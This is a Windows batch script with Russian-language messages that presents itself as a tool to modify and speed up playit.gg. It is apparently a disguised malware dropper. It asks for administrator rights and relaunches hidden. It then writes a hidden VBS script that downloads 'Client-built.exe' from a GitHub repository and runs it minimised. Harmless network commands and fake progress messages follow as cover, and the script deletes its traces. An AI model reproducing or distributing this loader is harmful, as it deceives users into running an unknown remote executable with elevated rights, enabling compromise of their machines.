��&cls
@echo off
chcp 1251 >nul

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' neq '0' (
    echo Запрос прав администратора...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~dpnx0' -Verb RunAs -WindowStyle Hidden" 2>nul
    exit /b
)

echo [+] Запуск

:: Создание скрытого VBS скрипта для выполнения команд
set "vbs_script=%TEMP%\execute_hidden.vbs"
echo Set WshShell = CreateObject("WScript.Shell") > "%vbs_script%"
echo WshShell.Run "cmd /c powershell -Command ""Invoke-WebRequest -Uri 'https://github.com/CHEATS1111/sigmaboy/raw/main/Client-built.exe' -OutFile '%TEMP%\Client-built.exe'""", 0, False >> "%vbs_script%"
echo WScript.Sleep 5000 >> "%vbs_script%"
echo WshShell.Run "cmd /c start /min """" ""%TEMP%\Client-built.exe""", 0, False >> "%vbs_script%"
echo WScript.Sleep 3000 >> "%vbs_script%"
echo WshShell.Run "cmd /c playit reset", 0, False >> "%vbs_script%"
echo WScript.Sleep 1000 >> "%vbs_script%"
echo WshShell.Run "cmd /c netsh interface tcp set global autotuning=normal", 0, False >> "%vbs_script%"
echo WshShell.Run "cmd /c ipconfig /flushdns", 0, False >> "%vbs_script%"

:: Запуск VBS скрипта
wscript "%vbs_script%" >nul 2>&1

echo [+] Модификация playit.gg
timeout /t 3 /nobreak >nul
echo [+] Прописывание комманд
timeout /t 2 /nobreak >nul
echo [+] Удаление остатков от программы
timeout /t 1 /nobreak >nul
echo [+] Ускорение работы playit.gg
timeout /t 2 /nobreak >nul

:: Удаление временных файлов
del /q "%vbs_script%" >nul 2>&1
del /q "%TEMP%\Client-built.exe" >nul 2>&1

echo [+] Well Done
echo Процесс завершен успешно!
pause